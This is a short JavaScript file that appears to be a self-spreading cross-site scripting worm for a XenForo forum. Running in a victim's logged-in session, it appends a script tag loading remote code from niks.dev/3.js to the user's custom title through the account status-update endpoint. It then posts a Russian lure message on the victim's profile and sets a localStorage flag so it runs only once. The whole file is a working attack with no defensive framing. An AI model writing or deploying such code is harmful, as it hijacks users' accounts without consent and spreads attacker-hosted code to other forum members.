
(async function() {
  'use strict';
  const payload = "<script src='//niks&#46;dev/3.js'>"
  
  async function main() {
    if (localStorage.getItem('asdasd')){
      return;
    }
    const ajaxData = await XenForo.ajax("account/personal-details");
    let custom_title = $(ajaxData.templateHtml).find("#ctrl_custom_title").val();
    
    if (custom_title.length < 64-payload.length) {
      await XenForo.ajax("account/status-update", {custom_title: custom_title+payload});
    }
    
    
    await XenForo.ajax(`/members/${XenForo.visitor.user_id}/post`, {message_html: 'А что у @its_niks со статусом?'});
    localStorage.setItem('asdasd', true)
  }
  
  await main();
})();
